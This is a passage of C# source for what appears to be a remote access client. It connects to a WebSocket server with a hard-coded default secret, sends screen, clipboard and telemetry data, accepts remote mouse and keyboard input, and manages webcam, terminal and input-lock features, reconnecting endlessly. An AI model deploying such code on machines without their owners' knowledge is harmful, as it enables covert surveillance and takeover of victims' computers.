        catch (Exception ex) { ExitForm.Log($"command-output send error: {ex.Message}"); }
    }

    private async Task HandleClipboardGet(System.Text.Json.JsonElement root)
    {
        try
        {
            var requestId = root.TryGetProperty("requestId", out var rid) ? rid.GetString() : null;
            var text = "";
            this.Invoke(() =>
            {
                try { text = Clipboard.GetText() ?? ""; }
                catch { text = ""; }
            });
            if (ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null) return;
            var payload = new Dictionary<string, object?> { ["type"] = "clipboard-content", ["requestId"] = requestId, ["text"] = text };
            var json = System.Text.Json.JsonSerializer.Serialize(payload);
            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
        }
        catch (Exception ex)
        {
            ExitForm.Log($"clipboard-get error: {ex.Message}");
        }
    }


    private void ApplyStreamQuality(System.Text.Json.JsonElement root)
    {
        var level = root.TryGetProperty("qualityLevel", out var ql) ? ql.GetString()?.ToLowerInvariant() : null;
        var jpeg = root.TryGetProperty("jpegQuality", out var jq) && jq.TryGetInt32(out var jv) ? jv : 85;
        _jpegQuality = Math.Clamp(jpeg, 10, 100);
        switch (level)
        {
            case "low":
                timer.Interval = 100;                    // 10 FPS
                _captureWidth = 1280;                      // HD
                _captureHeight = 720;
                break;
            case "high":
                timer.Interval = 33;                     // 30 FPS
                _captureWidth = 1920;                      // Full HD
                _captureHeight = 1080;
                break;
            default:
                timer.Interval = 33;                     // 30 FPS
                _captureWidth = 1920;                      // Full HD
                _captureHeight = 1080;
                break;
        }
    }

    private static void HandleRemoteControl(System.Text.Json.JsonElement root, string? action)
    {
        double xNorm = root.TryGetProperty("xNorm", out var xn) && xn.TryGetDouble(out var xv) ? xv : 0.5;
        double yNorm = root.TryGetProperty("yNorm", out var yn) && yn.TryGetDouble(out var yv) ? yv : 0.5;
        string button = root.TryGetProperty("button", out var be) ? (be.GetString() ?? "left") : "left";
        int delta = root.TryGetProperty("delta", out var de) && de.TryGetInt32(out var dv) ? dv : 120;
        string? key = root.TryGetProperty("key", out var ke) ? ke.GetString() : null;
        int keyCode = root.TryGetProperty("keyCode", out var kce) && kce.TryGetInt32(out var kcv) ? kcv : 0;

        try
        {
            switch (action)
            {
                case "mouse-down":
                    InputHelper.MouseDown(xNorm, yNorm, button);
                    break;
                case "mouse-up":
                    InputHelper.MouseUp(xNorm, yNorm, button);
                    break;
                case "mouse-move":
                    InputHelper.MouseMove(xNorm, yNorm);
                    break;
                case "mouse-wheel":
                    InputHelper.MouseWheel(xNorm, yNorm, delta);
                    break;
                case "key-press":
                    var vkPress = InputHelper.QtKeyToVk(keyCode, key);
                    if (vkPress.HasValue)
                        InputHelper.KeyPress(vkPress.Value);
                    break;
                case "key-release":
                    var vkRelease = InputHelper.QtKeyToVk(keyCode, key);
                    if (vkRelease.HasValue)
                        InputHelper.KeyRelease(vkRelease.Value);
                    break;
                case "mouse_left":
                    InputHelper.MouseDown(0.5, 0.5, "left");
                    InputHelper.MouseUp(0.5, 0.5, "left");
                    break;
                case "mouse_right":
                    InputHelper.MouseDown(0.5, 0.5, "right");
                    InputHelper.MouseUp(0.5, 0.5, "right");
                    break;
                case "mouse_center":
                    InputHelper.MouseMove(0.5, 0.5);
                    break;
            }
        }
        catch (Exception ex)
        {
            ExitForm.Log($"Input error ({action}): {ex.Message}");
        }
    }

    private async void BtnStart_Click(object? sender, EventArgs? e)
    {
        var url = (txtWebSocket.Text ?? "").Trim();
        if (string.IsNullOrEmpty(url)) return;

        btnStart.Enabled = false;

        // Infinite reconnect loop
        while (true)
        {
            lblStatus.Text = "Status: Connecting to " + url + " ...";
            cts = new System.Threading.CancellationTokenSource();
            ws = new System.Net.WebSockets.ClientWebSocket();
            
            try
            {
                using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(15)))
                {
                    using (var linked = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(cts.Token, timeoutCts.Token))
                    {
                        await ws.ConnectAsync(new Uri(url), linked.Token);
                    }
                }
                lblStatus.Text = "Status: Joining room...";

                var machineId = Environment.MachineName ?? "CSharpSender";
                var roomId = (txtRoomId?.Text ?? "").Trim();
                var secret = (txtSecret?.Text ?? "").Trim();
                if (string.IsNullOrEmpty(roomId)) roomId = "ops-room";
                if (string.IsNullOrEmpty(secret)) secret = "boi123";
                var join = new Dictionary<string, object>
                {
                    ["type"] = "join",
                    ["role"] = "sender",
                    ["roomId"] = roomId,
                    ["secret"] = secret,
                    ["machineId"] = machineId
                };
                var joinJson = System.Text.Json.JsonSerializer.Serialize(join);
                var joinBytes = System.Text.Encoding.UTF8.GetBytes(joinJson);
                await SafeSendAsync(new ArraySegment<byte>(joinBytes), System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);

                var replyBuffer = new byte[4096];
                var replyResult = await ws.ReceiveAsync(new ArraySegment<byte>(replyBuffer), cts.Token);
                
                if (replyResult.MessageType == System.Net.WebSockets.WebSocketMessageType.Close)
                {
                    // Server gracefully closed immediately during join
                    throw new Exception("Server closed connection during handshake.");
                }
                
                var replyJson = System.Text.Encoding.UTF8.GetString(replyBuffer, 0, replyResult.Count);
                using (var doc = System.Text.Json.JsonDocument.Parse(replyJson))
                {
                    var type = doc.RootElement.GetProperty("type").GetString();
                    if (type == "error")
                    {
                        var msg = doc.RootElement.TryGetProperty("message", out var m) ? m.GetString() : "Join failed";
                        throw new Exception($"Join failed: {msg}");
                    }
                }

                lblStatus.Text = "Status: Streaming";
                _ = FetchGeoAsync();
                timer.Start();
                telemetryTimer.Start();
                
                // Blocks here continuously processing messages until the socket breaks or is closed
                _listenTask = ListenForMessagesAsync();
                await _listenTask;
            }
            catch (Exception ex)
            {
                ExitForm.Log($"Connection dropped or failed: {ex.Message}");
            }
            finally
            {
                // Clean up the broken state cleanly
                timer.Stop();
                telemetryTimer.Stop();
                webcamTimer.Stop();
                _ = Task.Run(() => WebcamCapture.Cleanup());
                _terminalSession?.Stop();
                _terminalSession = null;
                InputLockHelper.SetLock(false);
                
                // Cancel pending reads/writes FIRST to release SemaphoreSlim deadlocks instantly
                try { cts?.Cancel(); } catch { }
                
                // Try a polite close with a strict timeout, otherwise just abort
                if (ws != null && ws.State == System.Net.WebSockets.WebSocketState.Open)
                {
                    try 
                    { 
                        using var timeoutCts = new System.Threading.CancellationTokenSource(2000);
                        await ws.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure, "Restarting", timeoutCts.Token); 
                    } 
                    catch { }
                }
                
                try { ws?.Abort(); } catch { }
                ws?.Dispose();
                ws = null;
                
                try { cts?.Dispose(); } catch { }
                cts = null;
                _listenTask = null;
            }

            // Sleep 5 seconds before trying to auto-reconnect
            lblStatus.Text = "Status: Reconnecting in 5s...";
            await Task.Delay(5000);
        }
    }

}
